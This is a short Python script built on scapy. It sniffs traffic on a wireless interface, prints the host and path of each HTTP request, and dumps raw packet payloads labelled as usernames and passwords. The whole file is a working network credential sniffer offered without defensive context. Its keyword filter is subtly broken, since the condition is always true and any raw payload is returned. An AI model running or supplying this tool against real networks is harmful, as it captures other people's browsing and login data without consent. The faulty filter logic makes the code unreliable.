import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=sniffed_packets)


def website_visited(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def credentials_pass(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        user_words = ["username", "user", "login", "password", "pass"]
        for words in user_words:
            if words in user_words:
                return load


def sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = website_visited(packet)
        print("Visited Websites and Image urls",url)
        credentials = credentials_pass(packet)
        if credentials:
            print("Usernames and Passwords",credentials)




sniff("wlan0")